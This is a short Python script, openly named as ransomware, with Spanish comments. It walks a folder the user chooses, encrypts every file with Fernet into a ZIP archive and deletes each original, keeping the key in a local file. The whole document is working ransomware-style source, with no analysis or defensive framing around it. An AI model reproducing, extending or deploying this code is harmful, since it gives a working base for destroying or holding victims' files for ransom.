# ransomware_encrypt_zip.py
import os
import zipfile
from cryptography.fernet import Fernet

def generate_key():
    """Genera y guarda una clave para la encriptación."""
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    """Carga la clave desde el archivo."""
    return open("encryption.key", "rb").read()

def encrypt_files_to_zip(folder, zip_filename):
    """Encripta todos los archivos en el directorio dado y los guarda en un ZIP."""
    key = generate_key()
    cipher = Fernet(key)

    with zipfile.ZipFile(zip_filename, "w") as zipf:
        for root, _, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = cipher.encrypt(file_data)
                encrypted_file_name = f"{file}.enc"

                # Escribe el archivo encriptado en el archivo ZIP
                zipf.writestr(encrypted_file_name, encrypted_data)

                # Borra el archivo original después de cifrar
                os.remove(file_path)

if __name__ == "__main__":
    folder_to_encrypt = input("Ingresa la dirección de la carpeta que quieres encriptar: ")
    zip_filename = input("Ingresa el nombre del archivo ZIP a crear (ejemplo: archivos_cifrados.zip): ")
    encrypt_files_to_zip(folder_to_encrypt, zip_filename)
